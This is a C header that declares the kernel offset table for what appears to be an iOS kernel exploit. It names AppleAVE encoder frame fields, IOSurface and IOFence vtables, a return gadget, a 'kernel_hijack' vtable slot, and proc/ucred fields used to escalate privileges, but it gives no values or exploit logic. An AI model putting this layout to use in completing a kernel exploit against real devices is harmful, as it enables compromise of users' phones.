/*
	Offsets for the kernel
*/

#include <mach/mach.h>

#ifndef OFFSETS_H_
#define OFFSETS_H_

#define OFFSET(offset)									offsets_get_offsets().offset

typedef struct offsets_e {
	uint64_t kernel_base;
	uint64_t encode_frame_offset_chroma_format_idc;
	uint64_t encode_frame_offset_ui32_width;
	uint64_t encode_frame_offset_ui32_height;
	uint64_t encode_frame_offset_slice_per_frame;
	uint64_t encode_frame_offset_info_type;
	uint64_t encode_frame_offset_iosurface_buffer_mgr;
	uint64_t kernel_address_multipass_end_pass_counter_enc;
	uint64_t encode_frame_offset_keep_cache;
	uint64_t iofence_vtable_offset;
	uint64_t iosurface_current_fences_list_head;
	uint64_t panic;
	uint64_t osserializer_serialize;
	uint64_t copyin;
	uint64_t copyout;
	uint64_t all_proc;
	uint64_t kern_proc;
	uint64_t l1dcachesize_handler;
	uint64_t l1dcachesize_string;
	uint64_t l1icachesize_string;
	uint64_t quad_format_string;
	uint64_t null_terminator;
	uint64_t cachesize_callback;
	uint64_t sysctl_hw_family;
	uint64_t ret_gadget;
	uint64_t struct_proc_p_comm;
	uint64_t struct_proc_p_ucred;
	uint64_t struct_kauth_cred_cr_ref;
	uint64_t struct_proc_p_uthlist;
	uint64_t struct_uthread_uu_ucred;
    uint64_t struct_uthread_uu_list;
    uint64_t iosurface_vtable_offset_kernel_hijack;

} offsets_t;



kern_return_t offsets_init();
offsets_t offsets_get_offsets();
void * offsets_get_kernel_base();
void offsets_set_kernel_base(void * kernel_base);


#endif /* OFFSETS_H_ */